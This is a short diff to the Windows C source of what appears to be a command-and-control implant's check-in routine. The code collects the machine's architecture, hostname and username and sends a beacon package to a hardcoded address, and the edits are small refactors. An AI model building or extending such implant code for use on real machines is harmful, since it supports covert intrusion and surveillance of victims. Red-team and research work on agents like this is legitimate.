@@ -1,5 +1,6 @@
 #include "Checkin.h"
 
+
 BYTE getArch()
 {
 	SYSTEM_INFO systemInfo;
@@ -18,17 +19,17 @@ PCHAR getHostname()
 {
 	LPSTR data = NULL;
 	DWORD dataLen = 0;
-	const char* hostname = "N/A";
+	const char* hostnameRep = "N/A";
 	if (!GetComputerNameExA(ComputerNameNetBIOS, NULL, &dataLen))
 	{
 		if (data = (LPSTR)LocalAlloc(LPTR, dataLen))
 		{
 			memset((PBYTE)data, 0, dataLen);
 			GetComputerNameExA(ComputerNameNetBIOS, data, &dataLen);
-			hostname = data;
+			hostnameRep = data;
 		}
 	}
-	return (char*)hostname;
+	return (char*)hostnameRep;
 }
 
 char* getUserName()
@@ -75,7 +76,6 @@ BOOL checkin()
 {
 	PPackage checkin = newPackage(0, TRUE);
 
-	addString(checkin, (PCHAR)"uuid", FALSE);
 	addInt32(checkin, 1);
 	addString(checkin, (PCHAR)"192.168.50.1", TRUE);
 	
@@ -90,8 +90,11 @@ BOOL checkin()
 
 	Parser* ResponseParser = sendPackage(checkin);
 
+	freePackage(checkin);
+
 	if (!ResponseParser)
 		return FALSE;
 
+	
 	return TRUE;
 }
